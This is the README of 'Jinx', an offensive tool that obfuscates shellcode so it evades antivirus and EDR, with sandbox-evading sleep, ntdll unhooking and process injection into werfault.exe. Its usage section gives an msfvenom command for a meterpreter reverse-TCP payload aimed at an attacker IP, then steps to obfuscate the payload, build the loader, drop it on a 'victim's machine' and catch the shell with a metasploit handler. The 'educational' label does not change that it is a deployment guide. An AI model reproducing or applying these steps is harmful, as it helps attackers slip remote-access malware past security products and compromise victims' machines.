# Jinx (For Educational Purposes Only)
## Shellcode obfuscation tool to avoid AV/EDR.
[![Python 3.10.4](https://img.shields.io/badge/Python-3.10.4-yellow.svg)](https://www.python.org/) [![C++ 14](https://img.shields.io/badge/C%2B%2B-14-blue)](https://visualstudio.microsoft.com/vs/features/cplusplus/) [![License: MIT](https://img.shields.io/badge/License-MIT-brightgreen.svg)](https://opensource.org/licenses/MIT)

## Features
- Custom Sleep Function - to bypass sandbox
- Obfuscation - base64 encoding and xor encryption with randomly generated key
- DLL Unhooking - full unhook of ntdll.dll
- Process Injection - injecting the payload to werfault.exe

## Requirements
Jinx requires [Python3](https://www.python.org/) and [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/) to run.

## Usage
1. Clone the repository:
```bash
git clone <url>
```

2. Generate the shellcode. In this demonstration we will use msfvenom in a kali machine:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -f raw -o shellcode
```

3. Put the shellcode in the cloned repository and use the obfuscator.py tool to obfuscate it.<br>Note: Our shellcode then be obfuscated to - **obfuscatedPayload.bin** with the key - **key.bin** and saved in loader/Jinx.
```bash
python3 obfuscator.py shellcode
```

4. Open loader/Jinx.sln, the Visual Studio solution file.
5. Build The project (Recommended: change the build configuration from Debug to Release).<br>Note: The executable file will be located at loader/x64/Release/Jinx.exe or loader/x64/Debug/Jinx.exe, depends on the build configuration.



with the release option (optional) and drop the executable onto the victim's machine.

On the attacker's machine use metasploit's multi/handler on port 1337 and on the victim's machine execute Jinx.

## Authors and acknowledgment
[RonKon](https://github.com/RonKonis) - Development
<br>
[dkonis](https://github.com/dkonis) - Research & Development
<br>
[SheL3G](https://github.com/SheL3G) - Research

## License
Distributed under the MIT License. See LICENSE.txt for more information.
